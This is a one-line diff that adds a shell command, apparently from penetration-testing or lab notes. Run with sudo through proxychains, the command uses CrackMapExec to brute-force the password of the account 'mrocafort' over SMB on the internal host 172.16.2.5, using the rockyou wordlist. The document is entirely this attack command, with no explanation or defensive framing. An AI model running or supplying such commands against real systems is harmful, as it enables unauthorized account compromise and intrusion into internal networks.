@@ -1,0 +1,1 @@
+sudo proxychains python3  /usr/lib/python3/dist-packages/cme/crackmapexec.py smb 172.16.2.5 -u 'mrocafort' -p /usr/share/wordlists/rockyou.txt 
